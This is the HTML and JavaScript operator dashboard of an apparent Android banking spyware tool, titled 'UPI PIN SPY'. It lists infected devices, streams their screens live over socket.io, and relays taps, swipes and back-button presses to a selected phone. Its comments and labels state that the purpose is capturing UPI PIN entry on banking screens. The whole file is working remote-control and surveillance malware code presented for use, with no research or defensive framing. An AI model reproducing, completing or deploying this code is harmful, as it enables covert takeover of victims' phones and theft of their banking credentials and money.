<!DOCTYPE html>
<html>
<head>
    <title>ðŸ“± UPI PIN SPY - Banking Layouts LIVE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; 
            background: linear-gradient(135deg,#0f0f23,#1a1a2e); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices { 
            position: fixed; top: 15px; left: 15px; z-index: 100; 
            background: rgba(0,0,0,0.95); padding: 20px; max-height: 85vh; 
            overflow-y: auto; width: 280px; border-radius: 16px; 
            backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1);
        }
        .device { 
            padding: 16px; margin: 10px 0; background: rgba(50,50,70,0.8); 
            cursor: pointer; border-radius: 12px; transition: all 0.2s; 
            border: 1px solid rgba(255,255,255,0.1);
        }
        .device:hover { background: rgba(0,170,120,0.9); transform: translateX(5px); }
        .device.active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; color: #000; }
        .disconnected { opacity: 0.4; }
        #phone-container { 
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
            width: min(95vw, 450px); height: min(95vh, 900px); 
            background: #000; border-radius: 40px; padding: 30px 25px; 
            box-shadow: 0 30px 80px rgba(0,0,0,0.8); 
            border: 3px solid rgba(255,255,255,0.1); touch-action: none;
        }
        #screen { 
            width: 100%; height: 100%; border-radius: 25px; background: #111; 
            image-rendering: optimizeSpeed; image-rendering: -moz-crisp-edges; 
            image-rendering: pixelated; cursor: pointer; 
            box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);
        }
        #status-bar { 
            position: fixed; top: 15px; right: 15px; z-index: 100; 
            background: rgba(0,0,0,0.9); padding: 15px 20px; border-radius: 12px; 
            backdrop-filter: blur(20px); font-size: 13px; 
            border: 1px solid rgba(255,255,255,0.1);
        }
        #fps-counter { color: #00ff88; font-weight: bold; }
        #controls { 
            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); 
            display: flex; gap: 15px; z-index: 100;
        }
        button { 
            padding: 14px 28px; background: linear-gradient(45deg, #00ff88, #00cc6a); 
            color: #000; border: none; border-radius: 30px; cursor: pointer; 
            font-size: 15px; font-weight: 600; transition: all 0.2s; 
            box-shadow: 0 8px 25px rgba(0,255,136,0.4);
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(0,255,136,0.6); }
        #waiting { 
            position: fixed; top: 50%; left: 50%; transform: translate(-50%,-50%); 
            font-size: 18px; color: #00ff88; display: none; text-align: center;
        }
    </style>
</head>
<body>
    <div id="devices">
        <h3 style="margin-bottom: 20px; color: #00ff88;">ðŸ“± LIVE Devices</h3>
        <div id="device-list">Connecting...</div>
    </div>
    
    <div id="status-bar">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div id="fps-counter">FPS: -- | Device: --</div>
        <div id="layoutStatus">UPI Layout: Waiting...</div>
    </div>

    <div id="phone-container">
        <canvas id="screen"></canvas>
    </div>

    <div id="waiting">
        <div style="font-size: 24px; margin-bottom: 10px;">ðŸŽ¯</div>
        UPI PIN Layouts Coming...
    </div>

    <div id="controls">
        <button onclick="sendBack()">ðŸ”™ Back</button>
        <button onclick="toggleFullScreen()">ðŸ“± Full</button>
    </div>

    <script>
        const socket = io({ 
            transports: ['websocket'], upgrade: false,
            timeout: 5000, reconnection: true, reconnectionAttempts: 20
        });
        
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 2400;
        let frameCount = 0, lastFrameTime = 0, totalFrames = 0;
        let isDragging = false, dragStart = { x: 0, y: 0 };
        
        const canvas = document.getElementById('screen');
        const ctx = canvas.getContext('2d');
        const phoneContainer = document.getElementById('phone-container');
        const deviceList = document.getElementById('device-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const fpsCounter = document.getElementById('fps-counter');
        const layoutStatus = document.getElementById('layoutStatus');
        const waiting = document.getElementById('waiting');

        socket.on('connect', () => {
            console.log('âœ… SOCKET LIVE!');
            connectionStatus.textContent = 'âœ… LIVE';
            connectionStatus.style.color = '#00ff88';
            fetchDevices();
        });

        // ðŸ”¥ SHOW ALL FRAMES FROM ALL DEVICES (NO SELECT NEEDED!)
        socket.on('screen-frame', (data) => {
            totalFrames++;
            console.log(`ðŸ“± Frame #${totalFrames} (${data.width}x${data.height}) â†’ ${data.deviceId.slice(0,8)}`);
            
            if (data.width && data.height) {
                deviceWidth = data.width;
                deviceHeight = data.height;
                currentDevice = data.deviceId; // AUTO SELECT
                
                // ðŸ”¥ INSTANT HIDE WAITING
                waiting.style.display = 'none';
                layoutStatus.textContent = 'âœ… UPI PIN LAYOUT LIVE';
                layoutStatus.style.color = '#00ff88';
                
                renderFrame(data);
            }
        });

        // ðŸ”¥ ULTRA PRECISE UPI PIN RENDERING
        function renderFrame(data) {
            const img = new Image();
            img.onload = () => {
                const rect = phoneContainer.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;
                
                // ðŸ”¥ SHARP PIXELS FOR UPI BUTTONS
                ctx.imageSmoothingEnabled = false;
                ctx.drawImage(img, 0, 0, rect.width, rect.height);
                
                // FPS
                frameCount++;
                const now = performance.now();
                if (now - lastFrameTime >= 1000) {
                    const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                    fpsCounter.textContent = `FPS: ${fps} | Device: ${currentDevice?.slice(0,8) || '--'}`;
                    frameCount = 0;
                    lastFrameTime = now;
                }
            };
            img.src = 'data:image/jpeg;base64,' + data.data;
        }

        // ðŸ”¥ PERFECT UPI PIN COORDINATES
        function getScaledCoords(clientX, clientY) {
            const rect = phoneContainer.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.round((clientX - rect.left) * scaleX),
                y: Math.round((clientY - rect.top) * scaleY)
            };
        }

        // ðŸ”¥ TOUCH + MOUSE (UPI PIN Perfect!)
        ['mousedown', 'touchstart'].forEach(ev => 
            phoneContainer.addEventListener(ev, startTouch, { passive: false })
        );
        ['mousemove', 'touchmove'].forEach(ev => 
            phoneContainer.addEventListener(ev, dragTouch, { passive: false })
        );
        ['mouseup', 'touchend'].forEach(ev => 
            phoneContainer.addEventListener(ev, endTouch)
        );

        function startTouch(e) {
            e.preventDefault();
            isDragging = true;
            const coords = getScaledCoords(
                e.touches?.[0]?.clientX || e.clientX,
                e.touches?.[0]?.clientY || e.clientY
            );
            dragStart = coords;
            sendControl('tap', coords.x, coords.y);
        }

        function dragTouch(e) {
            if (!isDragging || !currentDevice) return;
            e.preventDefault();
            const coords = getScaledCoords(
                e.touches?.[0]?.clientX || e.clientX,
                e.touches?.[0]?.clientY || e.clientY
            );
            sendControl('swipe', dragStart.x, dragStart.y, coords.x, coords.y);
        }

        function endTouch() {
            isDragging = false;
        }

        function sendControl(action, x, y, startX, startY, endX, endY) {
            if (!currentDevice) return;
            const data = { deviceId: currentDevice, action };
            if (x !== undefined) data.x = x;
            if (y !== undefined) data.y = y;
            if (startX !== undefined) { data.startX = startX; data.startY = startY; }
            if (endX !== undefined) { data.endX = endX; data.endY = endY; }
            socket.emit('control', data);
            console.log(`ðŸŽ® ${action} â†’ (${x?.toFixed(0)},${y?.toFixed(0)})`);
        }

        function fetchDevices() {
            fetch('/devices').then(r => r.json()).then(devices => {
                updateDeviceList(devices);
            });
        }

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.map(([id, info]) => `
                <div class="device ${info.connected ? '' : 'disconnected'} ${currentDevice === id ? 'active' : ''}" 
                     onclick="selectDevice('${id}', this)">
                    <b>${info.model?.slice(0,12) || id.slice(0,8)}</b><br>
                    <small>${info.brand || 'Android'}</small><br>
                    <span style="font-size:12px;">${info.connected ? 'ðŸŸ¢ LIVE' : 'ðŸ”´ OFF'}</span>
                </div>
            `).join('') || '<div style="opacity:0.5;">No devices</div>';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            console.log('ðŸŽ¯ SELECTED:', deviceId);
        }

        function sendBack() {
            sendControl('back');
        }

        function toggleFullScreen() {
            document.fullscreenElement ? document.exitFullscreen() : document.documentElement.requestFullscreen();
        }

        // ðŸ”¥ DEBUG CONSOLE
        setInterval(() => {
            console.log(`ðŸ“Š Total Frames: ${totalFrames} | Active: ${currentDevice?.slice(0,8) || 'None'}`);
        }, 5000);
    </script>
</body>
</html>
